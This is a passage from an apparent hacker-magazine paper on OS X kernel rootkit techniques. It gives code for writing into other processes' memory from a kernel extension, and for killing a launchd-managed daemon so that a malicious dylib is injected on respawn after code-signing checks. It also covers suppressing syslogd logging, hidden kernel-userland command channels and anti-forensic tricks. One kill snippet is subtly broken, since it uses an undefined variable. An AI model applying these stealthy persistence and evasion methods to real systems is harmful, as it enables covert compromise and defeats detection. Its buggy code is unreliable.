    // Shared between lookup and commit routines.
    char        *cn_pnbuf;      /* pathname buffer */
    int         cn_pnlen;       /* length of allocated buffer */
    char        *cn_nameptr;    /* pointer to looked up name */
    int         cn_namelen;     /* length of looked up component */
    uint32_t    cn_hash;        /* hash value of looked up name */
    uint32_t    cn_consume;     /* chars to consume in lookup() */
};

A small example to lookup /mach_kernel:
 struct componentname cnp;
 char tmpname[] = "mach_kernel";
 bzero(&cnp, sizeof(cnp));
 
 cnp.cn_nameiop = LOOKUP;
 cnp.cn_flags = ISLASTCN;
 cnp.cn_reserved1 = vfs_context_create(NULL);
 cnp.cn_pnbuf = tmpname;
 cnp.cn_pnlen = sizeof(tmpname);
 cnp.cn_nameptr = cnp.cn_pnbuf;
 cnp.cn_namelen = (int)strlen(tmpname); // <- add NULL ?

Now we are ready to call VNOP_LOOKUP() and use the returned vnode information to
execute VNOP_READ() as in section 3.1 (do not forget to create first the UIO
buffer).

Last but not least, there is another function we can (ab)use to read files -
vn_rdwr(). It was this function that triggered my curiosity about this process
while reading about the execution flow of a Mach-O binary. The parameters it
requires can be retrieved or created with the techniques above described or
others you might come up with. Feel free to implement it and discover
alternative ways to read the files (there are more!).

Writing is not harder than reading. Just browse the source files mentioned in
this section and the functions you need will be obvious. You can apply the
techniques here described to fill the required parameters.

----[ 3.4 - Solving kernel symbols

Snare on his blog post [5] explains in detail how to solve the kernel symbols.
The only difference is that instead of reading directly from kernel memory we
have the information in temporary buffers with data read from the filesystem.

The proposed workflow is:
1) Read the first page of /mach_kernel, which contains the Mach-O header.
2) Process the Mach-O header and retrieve the following information:
   - From __TEXT segment: vmaddr field (for ASLR slide computation).
   - From __LINKEDIT segment: fileoff and filesize (so we can read the segment).
   - From LC_SYMTAB command: symoff, nsyms, stroff, strsize.
   Refer to [10] for more information about Mach-O file format.
3) Allocate buffer and read the whole __LINKEDIT segment.
4) Solve any required symbol by processing the __LINKEDIT buffer using the
LC_SYMTAB collected information (offsets to symbol and string tables).
5) Do not forget to add the kernel ASLR slide to the addresses. Slide can be
computed by the difference between running __TEXT vmaddr and the one read from
disk.

There is no need to read the whole mach_kernel file into kernel space, we just
need the headers and __LINKEDIT segment, around 1MB, smaller than the
7.8MB of Mountain Lion 10.8.2 full kernel. Kernel memory is at a premium :-)

--[ 4 - Executing userland binaries from the kernel

This section describes a technique to execute userland processes from a kernel
extension (not tested but should also be valid from IOKit drivers). For this
purpose wowie and ghalen used the KUNC API (Kernel-User Notification Center), a
straightforward interface to execute userland executables. One problem with KUNC
is that the required symbols are provided by the Unsupported KPI and Apple has
the following note: The Kernel-User Notification Center APIs are not available
to KEXTs that declare dependencies on the sustainable kernel programming
interfaces (KPIs) introduced in OS X v10.4.

Having different ways to accomplish a given goal is more fun and improves
knowledge, which is this paper's main goal. The technique to be presented is
probably not the most efficient one but it is a good learning experience about
playing with kernel and how everything is implemented.

----[ 4.1 - Writing from kernel memory into userland processes

The first step is to find a way to write to userland process addresses from a
kernel extension. In userland there is the mach_vm_write() function (or older
vm_write()) to write to any arbitrary process, assuming we have the right
permissions to do so (task_for_pid() is our friend). 
Its prototype is:
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address,
              vm_offset_t data, mach_msg_type_number_t dataCnt);

If you look at the definition of the task structure (a void* at proc structure
but defined at osfmk/kern/task.h) you can find the first parameter to
mach_vm_write in the "map" field. The remaining parameters are the target
address, the data buffer to write and its size.

Do not forget that we need first to use mach_vm_protect (or vm_protect) to
change memory protections if trying to write to the read-only segments/sections.

The problem with this approach is that it does not work!
The memory protection is changed but mach_vm_write() does not modify the target
address. The answer is that if called like this we are trying to write data from
kernel space directly to the userland space, which should (obviously!) fail.
Remember we need to use copyin/copyout to copy between the two spaces.

We need another solution and I will present not one but two, both easy to use.
Thanks go to snare for giving me some initial sample code from his own research.

The first solution uses three functions, vm_map_copyin(), vm_map_copyout(), and
mach_vm_copy(). You can read their description at osfmk/vm/vm_map.c and
vm_user.c in XNU sources. 

vm_map_copyin creates an object from a given address located in a given map that
we can insert into another address space. This assures the correct transition
between kernel and user virtual memory spaces.
The vm_map_copyout() function copies the object into the target map, aka, our
target process. We need the vm_map_t info for kernel and target process - both
can be found by iterating proc list or proc_find(), as previously described.

There is one important detail about vm_map_copyout!
It injects the object "into newly-allocated space in the destination map". What
this means is that we are just copying the data into a new memory address at the
user process and not at the target address we want. 
Let me show you with an example of what happens using that command:
char *fname = "nemo_and_snare_rule!";
kern_return_t kr = 0;
vm_map_address_t dst_addr;

kr = vm_map_copyin(kernel_task->map, (vm_map_address_t)fname, strlen(fname)+1,
FALSE, &copy);
kr = vm_map_copyout(task->map, &dst_addr, copy);

dst_addr will contain the value 0x11fa000 (target was a 32 bits process).
Dumping the process memory:
sh-3.2# ./readmem -p 121 -a 0x11fa000 -s 32
[ Readmem v0.4 - (c) fG! ]
--------------------------
Memory protection: rw-/rwx

0x11fa000 6e 65 6d 6f 5f 61 6e 64 5f 73 6e 61 72 65 5f 72 nemo_and_snare_r
0x11fa010 75 6c 65 21 00 00 00 00 00 00 00 00 00 00 00 00 ule!............

At this point we need to copy the contents to the target address we want to.
This can be achieved using mach_vm_copy() - a function that copies one memory
region to another within the same task. The address where the data was copied to
can be found at the second parameter of vm_map_copyout(). 
It must be noticed that the first two functions are available as Private KPIs
and mach_vm_copy() is not exported (I cheated in above's example). Not a big
problem since we can easily solve the symbols.

The sample code to write to the Mach-O header of a 32 bits, no ASLR binary could
be something like this:
// get proc_t structure and task pointers
struct proc *p = proc_find(PID);
struct proc *p_kernel = proc_find(0);
struct task *task = (struct task*)(p->task);
struct task *kernel_task = (struct task*)(p_kernel->task);
kern_return_t kr = 0;
vm_prot_t new_prot = VM_PROT_WRITE | VM_PROT_READ;
kr = mach_vm_protect((vm_map_t)task->map, 0x1000, len, FALSE, new_prot);

vm_map_copy_t copy;
char *fname = "nemo_and_snare_rule!";
vm_map_address_t dst_addr;

// create a vm_map_copy_t object so we can insert it at userland process
kr = vm_map_copyin(kernel_task->map, (vm_map_address_t)fname,
strlen(fname)+1, FALSE, &copy);

// copy the object to userland, this will allocate a new space into target map
kr = vm_map_copyout((vm_map_t)task->map, &dst_addr, copy);
printf("wrote to userland address 0x%llx\n", CAST_USER_ADDR_T(dst_addr));

// and now we can use mach_vm_copy() because it copies data within the same task
kr = mach_vm_copy((vm_map_t)task->map, CAST_USER_ADDR_T(dst_addr),
strlen(fname)+1, 0x1000);
// release references created with proc_find() - must be always done!
proc_rele(p);
proc_rele(p_kernel);

To deallocate that new allocated space in userland vm_map_remove() is a good
candidate:
/*
 *	vm_map_remove:
 *	Remove the given address range from the target map.
 *	This is the exported form of vm_map_delete.
 */
extern kern_return_t  
vm_map_remove(vm_map_t         map,
              vm_map_offset_t  start,
              vm_map_offset_t  end,
              boolean_t        flags);

An easy alternative is to just zero those bytes and assume that space as a small
memory leak. It works and it is not a big deal.

The second solution requires a single function and has no memory allocation
at the target process. We are talking about vm_map_write_user():
"Copy out data from a kernel space into space in the destination map. The space
must already exist in the destination map."

The prototype:
kern_return_t
vm_map_write_user(vm_map_t map, void *src_p, vm_map_address_t dst_addr,
vm_size_t size);

Where map is the vm_map_t of the target process, and src_p the kernel data
buffer we want to write to the process. The previous example using this
function:
struct proc *p = proc_find(PID);
struct task *task = (struct task*)(p->task);
kern_return_t kr = 0;
vm_prot_t new_protection = VM_PROT_WRITE | VM_PROT_READ;
char *fname = "nemo_and_snare_rule!";
// modify memory permissions
kr = mach_vm_protect(task->map, 0x1000, len, FALSE, new_protection);
kr = vm_map_write_user(task->map, fname, 0x1000, strlen(fname)+1);
proc_rele(p);

This alternative is easier and does not allocate new memory at the target.
Do not forget to restore the original memory permissions.

After so many words you are probably asking why not use copyout to copy from
kernel to userland? Well, of course it is possible but there is a problem. It
can't be used to overwrite to arbitrary processes - only against the current
process. Even if we try to change the current map to another process using
vm_map_switch(), copyout will always retrieve the current process so copyout
will fail with EFAULT if we try an address of another process that does not
exists in current. This means that it can be used, for example, inside a hooked
syscall but not to write to arbitrary processes.

----[ 4.2 - Abusing (again!) dyld to inject and run code

Most of the time hacking is about abusing features or lack-of. This time we are
going to piggyback on dyld and launchd. Poor bastards!
The idea is that launchd will restart our target process and dyld will be
responsible for executing our code. I used the dyld approach in OS.X/Boubou PoC
described at [12] and [34], so why not again? It is easy to implement and works
very well.

The core of this idea is to emulate the DYLD_INSERT_LIBRARIES (equivalent
to LD_PRELOAD for those coming from ELF Unix world) when a new process is
created. The library will be responsible for executing whatever we want to. 
In this case we want to modify the Mach-O header before passing control to dyld.
When dyld gains control (it is dyld who passes control to target's entrypoint
not the kernel) it will read the header from target's memory and process it.
This presents an opportunity to successfully modify and inject the Mach-O
header.

The presentations at Secuinside [11] and HitCon [12] discuss the Mach-O header
details and injection process. This is valid for dynamically linked executables,
where execution will start at the dynamic linker (/usr/lib/dyld) and then
continue at the executable entry point.

Launchd is the perfect target because it can automatically respawn daemons and
agents, at root or user privilege level. The idea is to kill a daemon, intercept
the respawn and inject the library we want to be executed. The privilege level
we want to execute at depends on the target daemon.

What we need is to find a good place to intercept the respawn of the target
process and modify its memory before control is passed to dyld.

A simplified version of the binary execution process, adapted from [13] is:
     execve() -> __mac_execve() 
                        |
                        v
               exec_activate_image() 
                        |
                        v
                    Read file 
                        |
                        v
           .----> exec_mach_imgact() -> run dyld -> target entry point 
           |            |
           |            v
           |       load_machfile()
           |            |
           |            v
           |      parse_machfile()   [maps the load commands into memory]
           |            |
           |            v
           |       load_dylinker()   [sets image entrypoint to dyld]
           |            |
           |            v
           `--------- (...)

Chapter 7 of [14] and Chapter 13 of [13] thoroughly describe the execution
process in case you are interested in every detail.

The above diagram presents many places where we can modify the new process
memory and its Mach-O header. As previously mentioned, when dyld gains
control it will parse again the Mach-O header so our modification is guaranteed
to be used if made before dyld's control.
We can confirm this by looking at dyld source code [15]:
//
// Entry point for dyld.  The kernel loads dyld and jumps to __dyld_start which
// sets up some registers and call this function.
//
// Returns address of main() in target program which __dyld_start jumps to
//
uintptr_t
_main(const macho_header* mainExecutableMH, uintptr_t mainExecutableSlide, 
        int argc, const char* argv[], const char* envp[], const char* apple[], 
        uintptr_t* startGlue)

One curious detail (without any practical application I can foresee now) is that
dyld does not validate the header - the magic value can be modified to anything
and dyld will happily continue its work. Kernel data can be trusted, right?

----[ 4.3 - Finding the place to execute the injection

With theory in place it is finally time to move to practice!
We need to find one or more places where we can modify the target process memory
and inject our dynamic library.

The kernel has no symbol stubs so we can't just modify a pointer and hijack a
useful function. One solution is to inline hook the function prologue and make
it jump to our function. We can simplify this by implementing the whole original
function (copy from XNU source into our rootkit); this way we do not need to
return back to the original one, just restore the original bytes when we finish
our evil work.

A good starting point to look for candidate functions is exec_mach_imgact(). The
reason why is that when it returns control to dyld everything required to
execute the new process is set (kernel side). As much as possible near its end
is best.

After exploring exec_mach_imgact, I found a good candidate at
task_set_dyld_info(). It is called twice, one before the image is loaded into
memory, and another after the image is loaded. Clearly, the former does not
interest us so we need to distinguish between each case. This function is only
used at exec_mach_imgact().

Looking at its code in osfmk/kern/task.c:
void
task_set_dyld_info(task_t task, mach_vm_address_t addr, mach_vm_size_t size)
{
    task_lock(task);
    task->all_image_info_addr = addr;
    task->all_image_info_size = size;
    task_unlock(task);
}

The locks calls are nothing else than macros using a symbol available in KPIs:
#define task_lock(task)     lck_mtx_lock(&(task)->lock)
#define task_unlock(task)   lck_mtx_unlock(&(task)->lock)

It is a great candidate - we can copy & paste its code into our rootkit source,
add our code to inject the library and then execute the original function code.
Because it is not a static function we can find its symbol.
The first parameter is a task_t structure, which has a pointer to the
correspondent proc_t structure (remember that proc and task structures are
connected to each other via void pointers).

The proposed workflow could be:
1) Find task_set_dyld_info() address.
2) Patch prologue to jump to our function.
3) Execute our function to inject library.
4) Restore original bytes from 2).
5) Execution continues, our library is executed by dyld.

The only problem with this function is here at exec_mach_imgact():
    /*
     * Remember file name for accounting.
     */
    p->p_acflag &= ~AFORK;
    /* If the translated name isn't NULL, then we want to use
     * that translated name as the name we show as the "real" name.
     * Otherwise, use the name passed into exec.
     */
    if (0 != imgp->ip_p_comm[0]) {
        bcopy((caddr_t)imgp->ip_p_comm, (caddr_t)p->p_comm,
            sizeof(p->p_comm));
    } else {
        if (imgp->ip_ndp->ni_cnd.cn_namelen > MAXCOMLEN)
            imgp->ip_ndp->ni_cnd.cn_namelen = MAXCOMLEN;
        bcopy((caddr_t)imgp->ip_ndp->ni_cnd.cn_nameptr, (caddr_t)p->p_comm,
            (unsigned)imgp->ip_ndp->ni_cnd.cn_namelen);
        p->p_comm[imgp->ip_ndp->ni_cnd.cn_namelen] = '\0';
    }
    
The process name in proc_t structure is only set after the second call to
task_set_dyld_info(), so we can't use it to detect which process is going to be
executed and trigger or not our injection (remember we are only interested in a
specific process to be executed by launchd). A workaround to this problem is to
lookup the open files structure in proc_t (p_fd field).

An alternative solution is to use another function! There is an even better one
near the end of exec_mach_imgact() called proc_resetregister(). The advantage of
being near the end is that we can change a lot more things (kernel completed
most of its tasks related to new process execution), opening way for some cute
tricks.

Its implementation is also very simple [bsd/kern/kern_proc.c]:
void proc_resetregister(proc_t p)
{
    proc_lock(p);
    p->p_lflag &= ~P_LREGISTER;
    proc_unlock(p);
}

The lock/unlock here are implemented as functions instead of macros and not
exported. We can simply define the macros or change our code to use lck_mtx_*.
This time we have a proc_t structure and can use the p_comm field to find our
target(s) (or proc_name() to get the name of a given pid). Perfect spot!

With a location where to execute our modifications we can proceed to the last
step, modify the target Mach-O header.

----[ 4.4 - Ideas are great, execution is everything

Assuming that our hijacked function is proc_resetregister(), we can extract all
the information we will need from the proc_t parameter. Let's proceed with
this.

The number of binaries that use ASLR is increasing so the first step is to find
at which memory address is the binary loaded (the Mach-O header to be more
specific). The ASLR slide is generated inside load_machfile() and not set in a
struct/var or returned. One way to solve the problem is to take a peak at the
virtual memory map (vmap) of the target process. The following does the job
(assuming we are inside our own proc_resetregister()):

struct task *task = (struct task*)p->task;
mach_vm_address_t start_address = task->map->hdr.links.start;

Start contains the lower address of the process, which is where the Mach-O
header is located at. This *appears* to hold always true (there are good reasons
to believe it!).

To modify the Mach-O header of the target process we need to parse the header to
find free space where we can add the new LC_LOAD_DYLIB command. The necessary
free space is common - most binaries have enough slack space between the last
command and first code/data.

The header can be retrieved from the user space with vm_map_read_user() or
copyin (because here we are executing in current proc context).
After we have found the free space and the full Mach-O header is in our buffer,
we just need to add a new LC_LOAD_DYLIB command.

The two below diagrams show what needs to be done at the Mach-O header:
.-------------------.
|       HEADER      |<- Fix this struct:
|-------------------| struct mach_header {
|   Load Commands   |   uint32_t        magic;
|  .-------------.  |   cpu_type_t      cputype;
|  |  Command 1  |  |   cpu_subtype_t   cpusubtype;
|  |-------------|  |   uint32_t        filetype;
|  |  Command 2  |  |   uint32_t        ncmds;      <- add +1
|  |-------------|  |   uint32_t        sizeofcmds; <- += size of new cmd
|  |     ...     |  |   uint32_t        flags;
|  |-------------|  |  };
|  |  Command n  |  |
|  |-------------|  |
|  | Command n+1 |  |<- add new command here:
|  `-------------´  | struct dylib_command {
|-------------------|  uint32_t        cmd;
|        Data       |  uint32_t        cmdsize;
| .---------------. |  struct dylib    dylib;
| |   | Section 1 | | };
| | 1 |-----------| | struct dylib {
| |   | Section 2 | |  union lc_str  name;
| `---------------´ |  uint32_t timestamp;
| .---------------. |  uint32_t current_version;
| |   | Section 1 | |  uint32_t compatibility_version;
| | 2 |-----------| | };
| |   | Section 2 | | union lc_str {
| `---------------´ |  uint32_t        offset;
|       ...         | #ifndef __LP64__ // not used
|                   |  char            *ptr;
|                   | #endif 
|                   | };
`-------------------´ 

A diff between original and modified:
.-------------------.     .-------------------.
|       HEADER      |     |       HEADER      |<- Fix this struct
|-------------------|     |-------------------| struct mach_header {
|   Load Commands   |     |   Load Commands   |  ...
|  .-------------.  |     |  .-------------.  | uint32_t  ncmds;     <- fix 
|  |  Command 1  |  |     |  |  Command 1  |  | uint32_t  sizeofcmds;<- fix
|  |-------------|  |     |  |-------------|  |  ...
|  |  Command 2  |  |     |  |  Command 2  |  |  };
|  |-------------|  |     |  |-------------|  |  
|  |     ...     |  |     |  |     ...     |  |  
|  |-------------|  |     |  |-------------|  |  
|  |  Command n  |  |     |  |  Command n  |  |
|  `-------------´  |     |  |-------------|  | 
|                   |---->|  | Command n+1 |  |<- add new command here
|                   |---->|  `-------------´  | struct dylib_command {
|-------------------|---->|-------------------|  uint32_t        cmd;
|        Data       |---->|        Data       |  uint32_t        cmdsize;
| .---------------. |---->| .---------------. |  struct dylib    dylib;
| |   | Section 1 | |---->| |   | Section 1 | | };
| | 1 |-----------| |     | | 1 |-----------| | 
| |   | Section 2 | |     | |   | Section 2 | | 
| `---------------´ |     | `---------------´ | 
| .---------------. |     | .---------------. | 
| |   | Section 1 | |     | |   | Section 1 | | 
| | 2 |-----------| |     | | 2 |-----------| | 
| |   | Section 2 | |     | |   | Section 2 | | 
| `---------------´ |     | `---------------´ | 
|       ...         |     |       ...         | 
`-------------------´     `-------------------´ 

There are other methods to inject the library if there is not enough space. One
that requires only 24 bytes is described at [16]. 

This approach has one interesting advantage - it is not detectable by code
signing because the injection occurs after its checks and flags are set. 
This is the code that sets the flags:
    /* 
     * Set code-signing flags if this binary is signed, or if parent has
     * requested them on exec.
     */
    if (load_result.csflags & CS_VALID) {
        imgp->ip_csflags |= load_result.csflags &
            (CS_VALID|
             CS_HARD|CS_KILL|CS_EXEC_SET_HARD|CS_EXEC_SET_KILL);
    } else {
        imgp->ip_csflags &= ~CS_VALID;
    }

    if (p->p_csflags & CS_EXEC_SET_HARD)
        imgp->ip_csflags |= CS_HARD;
    if (p->p_csflags & CS_EXEC_SET_KILL)
        imgp->ip_csflags |= CS_KILL;

The code snippet is from exec_mach_imgact() and located well before our two
candidate functions described in section 4.3. Code signing does not kill
immediately the process. The flags are verified later and a kill signal sent
if code signing was configured to exit on failure (which we can also modify
here).

The only puzzle piece left is which process should we use and how to kill it.
There are many root processes controlled by launchd so it is just a matter of
selecting one with invisible and/or small impact. Spotlight is for example a
good candidate. A code snippet to do the killing:

proc_t victim = proc_find(TARGET_PID);
if (victim != PROC_NULL)
{
    // we need to release reference count from proc_find() before kill
    proc_rele(kill);
    // now we can kill the process
    psignal(kill, SIGKILL); // or use SIGSEV coz' Spotlight crashes, right? :-)
}

When launchd respawns the process, we can intercept it at exec_mach_imgact() and
do our magic. The rest is responsibility of the dynamic library.

----[ 4.5 - The dynamic library

The dynamic library is very easy to create if you use the Xcode template (oh the
drama, hackers use Makefiles!) or just Google for a simple Makefile.

To execute the library code you can add an entrypoint via a constructor:
extern void init(void) __attribute__ ((constructor));
void init(void)
{
    // do evil stuff here
}

init will be executed as soon as the library is loaded. Another way could be by
modifying the injected process symbol stub and redirect to an entrypoint
function inside the library. While the symbol stub modification could be made
from the kernel, we do not know yet where library will be loaded so it is harder
to execute this. For example, it could be delayed by hijacking a syscall, wait
for its execution and then modify a symbol. The downside is more time for
detection as explained in next section. Honestly I have not thought much about
this case.

To execute commands from the library it is just a matter of fork'ing and
exec'ing whatever command we need. We can also create a new thread (or multiple)
to leave a resident backdoor and so on. Or just execute the command we need and
clean up ourselves to leave no traces.

It is up to you and your particular requirements and imagination :-).

----[ 4.6 - Hiding our tracks

By principle, a rootkit should be as stealth as possible - we need to cover our
tracks to the maximum possible extent. Let me discuss a few problems and
potential solutions with the previously described approaches.

The first one is that we need to restart a target process. This will leave an
immediate clue on a (potentially very) higher PID, depending when the method is
used (near startup it is ok).
Another clue is that we are sending a signal to the target process and syslogd
will capture it. Instead of a kill we could send a SIGSEGV (Apple's software has
bugs, right?), or just temporarily memory patch syslogd daemon to avoid logging
our little trick. Different possibilities to solve this problem!

The SIGSEGV is particularly interesting since the resulting crash dump has no
useful information and it only leaves this log trail:
12/21/12 3:27:13.093 AM com.apple.launchd[1]: (com.apple.metadata.mds[277]) Job 
appears to have crashed: Segmentation fault: 11

Patching (temporarily or not) syslogd is rather easy to accomplish. Looking at
Apple's syslogd source we can find the following function in syslogd/daemon.c:
void process_message(aslmsg msg, uint32_t source)

Near the end it has this code:
 /* send message to output modules */
asl_out_message(msg);
if (global.bsd_out_enabled) bsd_out_message(msg);

The asl_out_message() appears to be the interesting place to patch. To quickly
test this theory we can attach gdb to syslogd (warning, ASLR enabled), and patch
that function. We need to search the function address because there are no debug
symbols available .
Let's look at its implementation:
void asl_out_message(aslmsg msg)
{
    dispatch_flush_continuation_cache();
    asl_msg_retain((asl_msg_t *)msg);
    dispatch_async(asl_action_queue, ^{
        _asl_action_message(msg);
        asl_msg_release((asl_msg_t *)msg);
    });
}

There are two external symbols, dispatch_flush_continuation_cache() and
asl_msg_retain(). The former has only a reference and the latter two. To find
the location of asl_out_message() we just need to find out the proc_t for
syslogd process, read and process its symbol table (we can read from memory or
filesystem), correct for ASLR slide, and find the address of the stub. Since
this is not IDA we can't easily find the cross-references (oh, IDA spoils us). 

What we can do is search in the binary the calls to the symbol stub (it is a
relative offset call). Even easier (and probably faster) is to disassemble and
match the address of the call with the stub - the disassembler will output the
final address.
After we have the address where dispatch_flush_continuation_cache() is called
from we just need to find the function prologue and patch it with a ret
(function return is void so no need for xor eax,rax). We can then restore the
original byte after we execute our command. Another function, bsd_out_message()
might need to be patched, but I leave that task to you, the reader.

Another alternative is to try to recycle the PID that was killed. The forkproc()
function is the one that allocates the new PID for the child. Might be
interesting to research and explore this alternative. You also might want to
reorder the proc list and move the new element to the original location instead
of being in newer location. Many possibilities to hide and try to detect the
rootkit actions. That is why it is fun!

The next issue is that process memory will have our injected library so we want
to remove it as soon as possible. I did some interesting work in this area but
NDA oblige and can't disclose it. It can be done and you should think about it,
or just use a brute approach and kill the process again and this time do not
inject anything. Whatever works :-)

There is no need to have a resident library somewhere at the filesystem ready to
be discovered. We can read and write from and to anywhere the filesystem so we
can store the library code encrypted inside the kernel module or store it
somewhere else, for example in a sqlite3 database (there are so many spread
all over OS X). Before the injection we can unpack it somewhere, execute it, and
then remove when not needed anymore.

One thing I had no time to verify if the impact from Spotlight if we use the
unpacking to filesystem approach. It might be able to detect the new file and
store in its database, so we must be careful over here.

--[ 5 - Revisiting userland<->kernel communication

Fortunately there are many options to establish communication between kernel and
userland applications in OS X. The sysctl interface previously presented [1] is
easy to implement but it is too cumbersome to transfer large amounts of data.
Let me present you additional options.

----[ 5.1 - Character devices and ioctl

The easiest way to have userland<->kernel communication is to create a
character device and use the ioctl interface to control it. We just need to
create and register the new device and add the necessary entry point functions.

It all starts with the structure cdevsw:
/*
 * Character device switch table
 */
struct cdevsw {
    open_close_fcn_t    *d_open;
    open_close_fcn_t    *d_close;
    read_write_fcn_t    *d_read;
    read_write_fcn_t    *d_write;
    ioctl_fcn_t         *d_ioctl;
    stop_fcn_t          *d_stop;
    reset_fcn_t         *d_reset;
    struct tty          **d_ttys;
    select_fcn_t        *d_select;
    mmap_fcn_t          *d_mmap;
    strategy_fcn_t      *d_strategy;
    void                *d_reserved_1;
    void                *d_reserved_2;
    int                 d_type;
};

The most interesting entrypoints for our purposes are open, close, ioctl.
If you are interested in using this communication channel, you probably should
think about encrypting it or some kind of authentication method. OS.X/Crisis has
no authentication whatsoever so anyone can send commands to the kernel rootkit
after (easily) finding all the possible ioctl commands.

The code is very simple so there is no point in discussing it here. The provided
source code implements this and kernel control so you can browse it and
verify how it is done.

Besides the problems with encryption, authentication and ioctl commands
reversing, this solution creates a new character device that needs to be hidden 
or else it will be too easy to detect. And then we have additional traces inside 
the kernel structures that need to be hidden, creating a vicious circle (rootkits
are a vicious circle of hide & seek and that is why they can be so fun to write
about).

----[ 5.2 - Kernel Control KPI

The kernel control KPI is interesting because it allows bidirectional
communication with userland and transfer of large amounts of data. Its
implementation is rather simple via a regular socket (PF_SYSTEM). Apple's
reference documentation can be found at [17] and sample code at [18].

A kernel extension is responsible for creating the socket and the userland part
will read and send data to that same socket (socket access can be restricted to
privileged users or everyone).
The kernel implementation is done by registering a control structure
kern_ctl_reg defined at bsd/sys/kern_control.h. From Apple's example:
// the reverse dns name to be used between kernel and userland
#define BUNDLE_ID   "put.as.hydra"

static struct kern_ctl_reg g_ctl_reg = {
 BUNDLE_ID,         /* use a reverse dns name */
 0,                 /* set to 0 for dynamically assigned control ID */
 0,                 /* ctl_unit - ignored when CTL_FLAG_REG_ID_UNIT not set */
 CTL_FLAG_PRIVILEGED,/* privileged access required to access this filter */
 0,                 /* use default send size buffer */
 0,                 /* Override receive buffer size */
 ctl_connect,       /* Called when a connection request is accepted */
 ctl_disconnect,    /* called when a connection becomes disconnected */
 NULL,              /* handles data sent from the client to kernel control */
 ctl_set,           /* called when the user process makes the setsockopt call */
 ctl_get            /* called when the user process makes the getsockopt call */
};

The connect and disconnect functions handle userland connections. When a new
connection is established we need to retain the unit id and control reference -
they are required for sending data and removing the kernel control.

The ctl_get function handles the communication from kernel to userland - sends
data to the socket when client requests it, and ctl_set handles data from
userland to kernel. The kernel data to be sent to userland should be enqueued
using ctl_enqueuedata() (this is where we need the unit id and control
reference).

A quick example of a function to enqueue the PID of a process:
static u_int32_t gClientUnit = 0;
static kern_ctl_ref gClientCtlRef = NULL;
/*
 * get data ready for userland to grab
 * send PID of the suspended process and let the userland daemon do the rest
 */
kern_return_t
queue_userland_data(pid_t pid)
{
    errno_t error = 0;
    if (gClientCtlRef == NULL) return KERN_FAILURE;
    
    error = ctl_enqueuedata(gClientCtlRef, gClientUnit, &pid, sizeof(pid_t), 0);

    if (error) printf("[ERROR] ctl_enqueuedata failed with error: %d\n", error);
    return error;
}

Another important detail is about the control ID. Since the recommended way is
to use a dynamically assigned control ID, the userland client needs somehow to
retrieve it. This can be done using a ioctl request (the reverse dns name must
be shared between the kernel and userland).

int gSocket = -1;
struct ctl_info ctl_info;
struct sockaddr_ctl sc;
gSocket = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
// the control ID is dynamically generated so we must obtain sc_id using ioctl
memset(&ctl_info, 0, sizeof(ctl_info));
strncpy(ctl_info.ctl_name, "put.as.hydra", MAX_KCTL_NAME);
ctl_info.ctl_name[MAX_KCTL_NAME-1] = '\0';
if (ioctl(gSocket, CTLIOCGINFO, &ctl_info) == -1)
{
    perror("ioctl CTLIOCGINFO");
    exit(1);
}
else
    printf("ctl_id: 0x%x for ctl_name: %s\n", ctl_info.ctl_id,
ctl_info.ctl_name);
// build the sockaddr control structure and finally connect to the socket
bzero(&sc, sizeof(struct sockaddr_ctl));
sc.sc_len = sizeof(struct sockaddr_ctl);
sc.sc_family = AF_SYSTEM;
sc.ss_sysaddr = AF_SYS_CONTROL;
sc.sc_id = ctl_info.ctl_id;
sc.sc_unit = 0;
ret = connect(gSocket, (struct sockaddr*)&sc, sizeof(sc));

After connection to the socket is established, the userland client can send data
using setsockopt() and receive with recv(). The remaining implementation details
are easy to understand by reading Apple's referenced sample code.

This communication channel might not be that interesting for rootkit'ing
purposes because it requires additional effort to hide, in particular the socket
information that can be explored by memory forensic tools. If commercial spyware
is using character devices for communication then we can't forget this
possibility when analysing a potentially compromised machine.

Nevertheless it can be interesting for other purposes. As an example, I created
a PoC (to be released later) to stop certain processes when they are created (
p->p_stat = SSTOP) and communicate their PID to a userland daemon. The userland
daemon attaches to the process and modifies whatever it needs. In this
particular case it is used to patch code signed applications without needing to
resign and patch any checksum checks. We already saw that OS X code-signining
verifications are done before the process is stopped and do not detect these
modifications (application own run-time code checksum checks are another
story!). It is not the best solution but just a nice set of tricks and demo  
usage of this communication channel.

----[ 5.3 - Alternative channels

The two presented solutions are easy to setup and use but also easy to detect.
Their main problem is that they leave "permanent" traces that need to be hidden
(kernel structures for example). This increases rootkit's complexity and chances
of being detected.
Covert channels are a lot more appropriate and a lot has been written about
them. Since it is so easy to use almost any kernel function, the possibilities
to be creative in this department are much higher. Data can be stealthy
read and written anywhere in the filesystem, bypassing many detection and
instrumentation mechanisms as it will be shown next. At the limit there is no
real need for a direct communication channel! For example, data can be encoded
in a binary and intercepted when it is executed. The possibilities are really
endless. This very short section is just a reminder that rootkit design can
be different from what is usually done and that you should think about it,
whether you belong to the offensive or defensive side.

--[ 6 - Anti-forensics

Mac OS X kernel is instrumentation rich, featuring DTrace and others. These can
assist in rootkit uncloaking. Memory forensics is also playing an important
role these days in malware detection and analysis. This section goal is to
present some ideas on how to attack or hide from these technologies. It is not
an exhaustive list but it tries to cover the main ones. OS X kernel is still big
and full of interesting places to be explored. Keep that in mind!
Due to time constraints it is not possible to write about fooling/defeating the
memory forensics tools as I initially planned. It was somewhat similar to what
was presented at 29C3 in Defeating Windows memory forensics presentation [33]
and other similar work presented in the past.

----[ 6.1 - Cheap tricks to reduce our footprint

An extremely easy trick to pull without any side consequences for us is to
remove the Mach-O header from process's memory. A memory dump will require
additional effort to find and rebuild the original binary (harder in userland
binaries, simpler in kernel extensions). Do not forget that Mach-O header
permissions are R-X so make it writable first.

Kernel extensions must have a start and stop function. Their prototype specifies
a kmod_info_t structure as first parameter. It is part of a linked list of all
loaded kernel extensions (used to hide the rootkit from kextstat but now marked
deprecated) and contains a very useful field to apply this cheap trick. 

typedef struct kmod_info {
    struct kmod_info  * next;
    int32_t             info_version;           // version of this structure
    uint32_t            id;
    char                name[KMOD_MAX_NAME];
    char                version[KMOD_MAX_NAME];
    int32_t             reference_count;        // # linkage refs to this
    kmod_reference_t  * reference_list;         // who this refs (links on)
    vm_address_t        address;                // starting address
    vm_size_t           size;                   // total size
    vm_size_t           hdr_size;               // unwired hdr size
    kmod_start_func_t * start;
    kmod_stop_func_t  * stop;
} kmod_info_t;

The "address" field contains the starting address of the currently loaded kext,
including the ASLR slide (kernel and kernel extensions Mach-O header values
